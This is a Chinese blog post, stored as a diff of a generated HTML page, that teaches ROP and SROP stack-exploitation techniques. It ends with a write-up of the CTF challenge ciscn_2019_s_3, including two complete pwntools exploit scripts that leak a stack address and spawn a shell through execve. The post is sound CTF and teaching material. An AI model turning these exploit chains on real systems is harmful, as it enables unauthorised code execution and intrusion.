@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>rop_and_srop - Theorist</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Theorist,"> 
+    <meta name="description" content="Theorist&#39;s Blog,一年没有更过博客了，这一年中在学了pwn相关，现在把博客重新整活过来，之后有时间把学的东西整理一下发出来。
+ROPROP的全称为Return-oriented programming（返回导向编程）,"> 
+    <meta name="author" content="Theorist"> 
+    <link rel="alternative" href="atom.xml" title="Theorist" type="application/atom+xml"> 
+    <link rel="icon" href="https://s2.ax1x.com/2019/07/10/Z6aCSs.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Theorist</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://theorist.fun"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">rop_and_srop</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">rop_and_srop</h1>
+        <div class="stuff">
+            <span>一月 28, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>一年没有更过博客了，这一年中在学了pwn相关，现在把博客重新整活过来，之后有时间把学的东西整理一下发出来。</p>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<p>ROP的主要思想就是攻击者不需要自己注入代码（因为在DEP的保护下，注入的代码不可执行），而是利用系统已有的代码片段来构造攻击。这里之所以叫ROP，是因为其改变控制流的方式是用系统中的<code>return</code>指令（比如x86中的<code>ret</code>）。</p>
+<p>ROP需要一个栈溢出，让攻击者可以修改栈上的数据，然后在程序中寻找一系列以<code>return</code>结尾的指令片段（我们将其称为”gadgets”）将其填入栈中合适的位置，通过<code>return</code>控制程序流将其连接起来，通过<code>pop</code>、<code>mov</code>等指令把写入栈相应位置的数据传到寄存器中，达到控制程序的目的。</p>
+<p>gadgets可以用<code>ROPgadget</code>进行搜索</p>
+<p>依赖安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure>
+
+<p>ROPgadget安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ROPgadget</span><br></pre></td></tr></table></figure>
+
+<p>使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary elf --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据32位和64位程序不同的函数传参方式应该用不同的方式编写payload传参：</p>
+<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>将函数的参数从右向左一次压入栈中，写payload时可以直接将参数写在栈上对应的位置。</p>
+<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p>在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code> 传递，当参数为6个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code> 和 <code>R9</code> 来传递。</p>
+<p>参数个数大于 7 个的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);  </span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9  </span><br><span class="line">h-&gt;8(%esp)  </span><br><span class="line">g-&gt;(%esp)  </span><br><span class="line">call H</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/09/MeEqbV.png"></p>
+<p>这种情况需要先把参数写入栈中，再利用程序中的<code>pop</code>和<code>mov</code>指令将参数传入相应的寄存器中，这些指令可以用ROPgadget寻找，<code>__libc_csu_init</code>函数中这段代码也常常拿来传参：</p>
+<p><img src="https://s3.ax1x.com/2021/01/31/yEs1JK.png"></p>
+<p>先控制程序返回到<code>0x400596</code>的位置，把写在栈上的数据<code>pop</code>到<code>r12</code>、<code>r13</code>等寄存器中，之后返回到<code>0x400580</code>将<code>r13</code>等寄存器中的数据转移到<code>rdx</code>等寄存器中，并调用<code>[r12+rbp*8]</code>处的函数。最近有学到一手可以把<code>[r12+rbp*8]</code>的设置成<code>pop;ret;</code>的地址来跳出csu。</p>
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p>
+<p>如下图所示，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p>
+<p><img src="https://s3.ax1x.com/2021/01/31/yEfeVe.png"></p>
+<p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p>
+<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p>
+<p><img src="https://s3.ax1x.com/2021/01/31/yE5XW9.png"></p>
+<p>我们将这段内存称为一个<code>Signal Frame</code>。</p>
+<p>在内核<code>sigreturn</code>系统调用处理函数中，会根据当前的栈指针指向的<code>Signal Frame</code>对进程上下文进行恢复，并返回用户态，从挂起点恢复执行</p>
+<h2 id="Signal机制缺陷利用"><a href="#Signal机制缺陷利用" class="headerlink" title="Signal机制缺陷利用"></a>Signal机制缺陷利用</h2><p>内核替用户进程将其上下文保存在<code>Signal Frame</code>中，然后，内核利用这个<code>Signal Frame</code>恢复用户进程的上下文。这个<code>Signal Frame</code>是被保存在用户进程的地址空间中的，是用户进程可读写的；而且内核并没有将保存的过程和恢复的过程进行一个比较，也就是说，在<code>sigreturn</code>这个系统调用的处理函数中，内核并没有判断当前的这个<code>Signal Frame</code>就是之前内核为用户进程保存的那个<code>Signal Frame</code>。<br>因此，完全可以自己在栈上放好上下文，然后自己调用re_sigreturn，跳过步骤1、2。此时，我们将通过步骤3、4让内核把我们伪造的上下文恢复到用户进程中，也就是说我们可以重置所有寄存器的值，一次到位地做到控制通用寄存器，rip和完成栈劫持。</p>
+<h2 id="一个简单的攻击"><a href="#一个简单的攻击" class="headerlink" title="一个简单的攻击"></a>一个简单的攻击</h2><p>假设一个攻击者可以控制用户进程的栈，那么它就可以伪造一个<code>Signal Frame</code>，如下图所示：</p>
+<p><img src="https://s3.ax1x.com/2021/01/31/yEozVK.png"></p>
+<p>在这个伪造的<code>Signal Frame</code>中，将<code>rax</code>设置成59（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（该字符串可以是攻击者写在栈上的），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在这个例子中，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个shell。<br>这是一个最简单的攻击。在这个攻击中，有4个前提条件：</p>
+<ol>
+<li>攻击者可以通过stack overflow等漏洞控制栈上的内容；</li>
+<li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；</li>
+<li>需要知道<code>syscall</code>指令在内存中的地址；</li>
+<li>需要知道<code>sigreturn</code>系统调用的内存地址。</li>
+</ol>
+<h2 id="利用SROP构造系统调用串"><a href="#利用SROP构造系统调用串" class="headerlink" title="利用SROP构造系统调用串"></a>利用SROP构造系统调用串</h2><p>通过再额外添加一个对栈指针<code>rsp</code>的控制，可以实现连续的系统调用：</p>
+<p><img src="https://s3.ax1x.com/2021/01/31/yEHm9g.png"></p>
+<p>另外需要把原来单纯的<code>syscall</code> gadget换成<code>syscall; ret</code> gadget。在这个过程中，每次<code>syscall</code>返回之后，栈指针都会指向下一个<code>Signal Frame</code>，因此，在这个时候执行<code>ret</code>指令，就会再次调用<code>sigreturn</code>系统调用。这样就可以通过操作栈来达到连续进行系统调用的效果。</p>
+<h2 id="pwntools中的SROP"><a href="#pwntools中的SROP" class="headerlink" title="pwntools中的SROP"></a>pwntools中的SROP</h2><p>可以直接调用pwntools的SigreturnFrame来快速生成SROP帧，需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行，因此我们可以通过syscall指令调用rt_sigreturn而不必特意去寻找这个调用的完整实现。此外，由于32位分为原生的i386（32位系统）和i386 on amd64（64位系统添加32位应用程序支持）两种情况，这两种情况的段寄存器设置有所不同</p>
+<blockquote>
+<p>#原生i386<br>context.arch = ‘i386’<br>SROPFrame = SigreturnFrame(kernel=’i386’)</p>
+<p>#amd64上运行的32位程序<br>context.arch = ‘i386’<br>SROPFrame = SigreturnFrame(kernel=’amd64’)</p>
+<p>#例<br>frame=SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=bin_sh_addr<br>frame.rsi=0<br>frame.rdx=0<br>frame.rip=syscall_addr</p>
+</blockquote>
+<h1 id="例：ciscn-2019-s-3"><a href="#例：ciscn-2019-s-3" class="headerlink" title="例：ciscn_2019_s_3"></a>例：ciscn_2019_s_3</h1><p>保护：</p>
+<blockquote>
+<pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+</blockquote>
+<p>存在栈溢出,使用syscall系统调用：</p>
+<p><img src="https://z3.ax1x.com/2021/05/26/2p3US0.png"></p>
+<p>gadgets:</p>
+<p><img src="https://z3.ax1x.com/2021/05/26/2p36YR.png"></p>
+<p>其中0fh是<code>rt_sigreturn</code>的系统调用号，3Bh是<code>execve</code>的系统调用号。</p>
+<p>vuln函数汇编：</p>
+<p><img src="https://z3.ax1x.com/2021/05/26/2p3Rl6.png"></p>
+<p>函数开始时把caller函数rbp压栈但在结束时没有取出，所以函数返回的地址其实是caller函数rbp的地址，是一个栈上的地址所以程序正常执行会报错，所以我们在进行栈溢出的时候只需要把返回地址写到rbp的位置。</p>
+<p>思路是利用ROP执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>，程序中没有”/bin/sh”，只能自己在<code>vuln</code>函数中输入到栈中再泄露栈地址。</p>
+<p>在进行栈溢出覆盖返回地址后发现在<code>vuln</code>输出的0x30字节数据中还有一盒栈地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;6xg $rsp-0x10</span><br><span class="line">0x7fffffffdf90: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x7fffffffdfa0: 0x6161616161616161      0x000000000040050a</span><br><span class="line">0x7fffffffdfb0: 0x00007fffffffe0b8      0x0000000100000000</span><br></pre></td></tr></table></figure>
+
+<p>0x00007fffffffe0b8是一个栈上的地址，可以计算偏移通过该地址算出输入数据的地址。</p>
+<h2 id="ROP解"><a href="#ROP解" class="headerlink" title="ROP解"></a>ROP解</h2><p>利用ROPgadget和csu里找到的gadgets编写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node3.buuoj.cn&#x27;,28391)</span></span><br><span class="line"></span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">pop_rbx_rbp__r12_r13_r14_r15_ret_addr=<span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_rsi_r14_edi_r15_call_r12rbx8_addr=<span class="number">0x400580</span></span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x4005a3</span></span><br><span class="line">mv_rax_3bh_addr=<span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40052c&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">0x2</span>+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))<span class="number">-0x128</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(mv_rax_3bh_addr)+p64(pop_rbx_rbp__r12_r13_r14_r15_ret_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh_addr+<span class="number">0x58</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx_r13_rsi_r14_edi_r15_call_r12rbx8_addr)+p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="SROP解"><a href="#SROP解" class="headerlink" title="SROP解"></a>SROP解</h2><p>不用一大堆gadgets传参，利用<code>syscall</code>调用<code>rt_sigreturn</code>解析我们在栈上伪造的<code>Signal Frame</code>进行传参</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29508</span>)</span><br><span class="line"></span><br><span class="line">mv_rax_sigreturn_ret_addr=<span class="number">0x4004da</span></span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">syscall_addr=<span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(mv_rax_sigreturn_ret_addr)+p64(syscall_addr)+bytes(frame)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=420154189.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=527957820.mp3'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1645064.mp3'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=39635710.mp3'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=464448450.mp3'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=33875750.mp3'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=864711417.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='b4b7681976b71e1c4b85'
+        data-cs='1c0802349efe79789f01f3b548e96a4baf049907'
+        data-r='HNightMan.github.io'
+        data-o='HNightMan'
+        data-a='HNightMan'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP"><span class="toc-number">1.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">1.1.</span> <span class="toc-text">x86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86-64"><span class="toc-number">1.2.</span> <span class="toc-text">x86-64</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-number">2.</span> <span class="toc-text">SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Signal%E6%9C%BA%E5%88%B6%E7%BC%BA%E9%99%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">Signal机制缺陷利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.3.</span> <span class="toc-text">一个简单的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SROP%E6%9E%84%E9%80%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%B2"><span class="toc-number">2.4.</span> <span class="toc-text">利用SROP构造系统调用串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools%E4%B8%AD%E7%9A%84SROP"><span class="toc-number">2.5.</span> <span class="toc-text">pwntools中的SROP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%EF%BC%9Aciscn-2019-s-3"><span class="toc-number">3.</span> <span class="toc-text">例：ciscn_2019_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">ROP解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP%E8%A7%A3"><span class="toc-number">3.2.</span> <span class="toc-text">SROP解</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
